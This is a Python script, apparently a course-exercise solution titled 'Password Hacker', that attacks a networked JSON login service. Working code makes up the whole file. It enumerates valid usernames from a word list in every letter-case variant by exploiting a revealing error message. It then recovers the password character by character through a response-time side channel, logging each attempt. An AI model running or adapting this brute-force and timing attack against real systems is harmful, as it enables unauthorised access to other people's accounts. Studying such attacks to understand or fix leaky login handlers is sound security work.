"""Password Hacker with Python - Hack Module"""
import json
import socket
import string
import time
from argparse import ArgumentParser, Namespace
from itertools import product
from typing import Any, Generator

import logging


def setup_logger(log_file: str = "hack.log") -> logging.Logger:
    """Set up logger to write to file"""
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)

    # File handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)

    # Formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    file_handler.setFormatter(formatter)

    logger.addHandler(file_handler)
    return logger

logger = setup_logger()

def parse_arguments() -> Namespace:
    """Parse command line arguments"""

    parser = ArgumentParser()
    parser.add_argument("ip", type=str, help="IP Address")
    parser.add_argument("port", type=int, help="Port")
    args = parser.parse_args()
    return args


def case_combinations(word: str) -> Generator[str, Any, None]:
    """Generate all case combinations of a word"""
    # Build list of (lower, upper) tuples for each char

    variants = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in word]
    for combo in product(*variants):
        yield ''.join(combo)


def generate_login() -> Generator[str, Any, None]:
    """Generate login guesses

    Reads passwords from 'logins.txt' and yields all case combinations
    """

    with open("logins.txt", "r") as file:
        passwords = file.read().splitlines()
        for password in passwords:
            for variant in case_combinations(password):
                yield variant


def guess_login(client: socket.socket) -> str:
    """Attempt to guess the login by trying all combinations

    The function is guessing until result: "Wrong password!" is received.
    """

    for login in generate_login():
        data = json.dumps({"login": login, "password": "dummyPassword"})
        client.send(data.encode())
        response = client.recv(1024).decode()
        response_data = json.loads(response)
        if response_data.get("result") == "Wrong password!":
            logger.debug(f"Login {login} was successful")
            return login
    return "not found"


def guess_password(client: socket.socket, login: str) -> str:
    alphabet = string.ascii_letters + string.digits
    password = []
    while True:
        for char in alphabet:
            attempt = ''.join(password) + char
            data = json.dumps({"login": login, "password": attempt})
            logger.debug("Trying password: %s", attempt)
            start_time = time.time()
            client.send(data.encode())
            response = client.recv(1024).decode()
            response_data = json.loads(response)
            end_time = time.time()
            elapsed_time = end_time - start_time
            logger.debug("Response time: %.5f seconds", elapsed_time)
            # Heuristic: if response time is significantly longer, we may be on the right track
            if response_data.get("result") == "Connection success!":
                return attempt
            elif elapsed_time > 0.1:  # Adjust threshold as needed
                password.append(char)
                break


def main():
    args = parse_arguments()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.connect((args.ip, args.port))
        login = guess_login(client)
        password = guess_password(client, login)
        print(json.dumps({"login": login, "password": password}))


if __name__ == "__main__":
    main()
